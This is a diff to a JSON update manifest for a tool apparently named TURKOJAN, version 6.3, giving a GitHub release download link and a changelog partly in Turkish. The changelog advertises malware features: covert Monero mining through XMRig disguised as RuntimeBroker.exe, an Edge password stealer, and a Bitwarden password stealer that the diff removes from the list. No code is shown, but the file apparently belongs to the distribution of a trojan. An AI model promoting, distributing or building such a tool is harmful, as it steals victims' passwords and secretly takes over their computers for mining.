@@ -2,5 +2,5 @@
   "version": "6.3",
   "download_url": "https://github.com/TURKOJAN-sys/TURKOJAN/releases/latest",
   "release_date": "2026-07-24",
-  "changelog": "- ⛏️ Monero Mining (XMRig entegrasyonu)\n- 🔑 Edge Password Stealer\n- 🔐 Bitwarden Password Stealer\n- 🔒 Mutex (çoklu çalıştırma engeli)\n- 🕵️ Mining gizleme (RuntimeBroker.exe)\n- Performans iyileştirmeleri"
+  "changelog": "- ⛏️ Monero Mining (XMRig entegrasyonu)\n- 🔑 Edge Password Stealer\n-  🔒 Mutex (çoklu çalıştırma engeli)\n- 🕵️ Mining gizleme (RuntimeBroker.exe)\n- Performans iyileştirmeleri"
 }
